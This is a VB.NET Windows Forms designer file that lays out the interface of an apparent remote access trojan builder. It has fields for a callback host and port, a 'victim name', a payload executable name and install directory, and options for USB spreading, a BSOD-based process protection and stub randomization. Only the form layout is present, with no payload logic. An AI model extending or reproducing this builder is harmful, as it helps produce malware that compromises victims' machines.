<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Builder
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.host = New System.Windows.Forms.TextBox()
        Me.port = New System.Windows.Forms.NumericUpDown()
        Me.VN = New System.Windows.Forms.TextBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.exe = New System.Windows.Forms.TextBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.dir = New System.Windows.Forms.ComboBox()
        Me.US = New System.Windows.Forms.CheckBox()
        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
        Me.bsod = New System.Windows.Forms.CheckBox()
        Me.rnz = New System.Windows.Forms.CheckBox()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.T1 = New System.Windows.Forms.TextBox()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        CType(Me.port, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(9, 9)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(29, 13)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "Host"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(218, 9)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(27, 13)
        Me.Label2.TabIndex = 1
        Me.Label2.Text = "Port"
        '
        'host
        '
        Me.host.Location = New System.Drawing.Point(12, 25)
        Me.host.Name = "host"
        Me.host.Size = New System.Drawing.Size(196, 20)
        Me.host.TabIndex = 2
        Me.host.Text = "127.0.0.1"
        '
        'port
        '
        Me.port.Location = New System.Drawing.Point(221, 25)
        Me.port.Maximum = New Decimal(New Integer() {10000, 0, 0, 0})
        Me.port.Name = "port"
        Me.port.Size = New System.Drawing.Size(123, 20)
        Me.port.TabIndex = 3
        Me.port.Value = New Decimal(New Integer() {9191, 0, 0, 0})
        '
        'VN
        '
        Me.VN.Location = New System.Drawing.Point(12, 69)
        Me.VN.Name = "VN"
        Me.VN.Size = New System.Drawing.Size(196, 20)
        Me.VN.TabIndex = 5
        Me.VN.Text = "HacKed"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(9, 53)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(66, 13)
        Me.Label3.TabIndex = 4
        Me.Label3.Text = "VicTim Name"
        '
        'exe
        '
        Me.exe.Location = New System.Drawing.Point(221, 69)
        Me.exe.Name = "exe"
        Me.exe.Size = New System.Drawing.Size(120, 20)
        Me.exe.TabIndex = 7
        Me.exe.Text = "Server.exe"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(218, 53)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(52, 13)
        Me.Label4.TabIndex = 6
        Me.Label4.Text = "ExeName"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(9, 96)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(51, 13)
        Me.Label5.TabIndex = 8
        Me.Label5.Text = "Directory"
        '
        'dir
        '
        Me.dir.FormattingEnabled = True
        Me.dir.Items.AddRange(New Object() {"%TEMP%", "%AppData%", "%UserProfile%", "%ProgramData%"})
        Me.dir.Location = New System.Drawing.Point(12, 112)
        Me.dir.Name = "dir"
        Me.dir.Size = New System.Drawing.Size(196, 21)
        Me.dir.TabIndex = 9
        Me.dir.Text = "%TEMP%"
        '
        'US
        '
        Me.US.AutoSize = True
        Me.US.Location = New System.Drawing.Point(362, 49)
        Me.US.Name = "US"
        Me.US.Size = New System.Drawing.Size(101, 17)
        Me.US.TabIndex = 10
        Me.US.Text = "USB Spread Nj4"
        Me.US.UseVisualStyleBackColor = True
        '
        'CheckBox1
        '
        Me.CheckBox1.AutoSize = True
        Me.CheckBox1.Location = New System.Drawing.Point(223, 112)
        Me.CheckBox1.Name = "CheckBox1"
        Me.CheckBox1.Size = New System.Drawing.Size(47, 17)
        Me.CheckBox1.TabIndex = 11
        Me.CheckBox1.Text = "Icon"
        Me.CheckBox1.UseVisualStyleBackColor = True
        '
        'bsod
        '
        Me.bsod.AutoSize = True
        Me.bsod.Location = New System.Drawing.Point(362, 72)
        Me.bsod.Name = "bsod"
        Me.bsod.Size = New System.Drawing.Size(139, 17)
        Me.bsod.TabIndex = 12
        Me.bsod.Text = "Protect Prosess [BSOD]"
        Me.bsod.UseVisualStyleBackColor = True
        '
        'rnz
        '
        Me.rnz.AutoSize = True
        Me.rnz.Location = New System.Drawing.Point(362, 25)
        Me.rnz.Name = "rnz"
        Me.rnz.Size = New System.Drawing.Size(103, 17)
        Me.rnz.TabIndex = 13
        Me.rnz.Text = "Randomize Stub"
        Me.rnz.UseVisualStyleBackColor = True
        '
        'Button1
        '
        Me.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Button1.Location = New System.Drawing.Point(362, 106)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(139, 23)
        Me.Button1.TabIndex = 14
        Me.Button1.Text = "Build"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'T1
        '
        Me.T1.ForeColor = System.Drawing.Color.Red
        Me.T1.Location = New System.Drawing.Point(217, 306)
        Me.T1.Multiline = True
        Me.T1.Name = "T1"
        Me.T1.Size = New System.Drawing.Size(100, 20)
        Me.T1.TabIndex = 16
        Me.T1.Visible = False
        '
        'PictureBox1
        '
        Me.PictureBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.PictureBox1.Location = New System.Drawing.Point(276, 96)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(65, 40)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 15
        Me.PictureBox1.TabStop = False
        '
        'Builder
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(511, 151)
        Me.Controls.Add(Me.T1)
        Me.Controls.Add(Me.PictureBox1)
        Me.Controls.Add(Me.Button1)
        Me.Controls.Add(Me.rnz)
        Me.Controls.Add(Me.bsod)
        Me.Controls.Add(Me.CheckBox1)
        Me.Controls.Add(Me.US)
        Me.Controls.Add(Me.dir)
        Me.Controls.Add(Me.Label5)
        Me.Controls.Add(Me.exe)
        Me.Controls.Add(Me.Label4)
        Me.Controls.Add(Me.VN)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.port)
        Me.Controls.Add(Me.host)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.Label1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.Name = "Builder"
        Me.Text = "Builder"
        CType(Me.port, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents host As System.Windows.Forms.TextBox
    Friend WithEvents port As System.Windows.Forms.NumericUpDown
    Friend WithEvents VN As System.Windows.Forms.TextBox
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents exe As System.Windows.Forms.TextBox
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents dir As System.Windows.Forms.ComboBox
    Friend WithEvents US As System.Windows.Forms.CheckBox
    Friend WithEvents CheckBox1 As System.Windows.Forms.CheckBox
    Friend WithEvents bsod As System.Windows.Forms.CheckBox
    Friend WithEvents rnz As System.Windows.Forms.CheckBox
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents T1 As System.Windows.Forms.TextBox

End Class
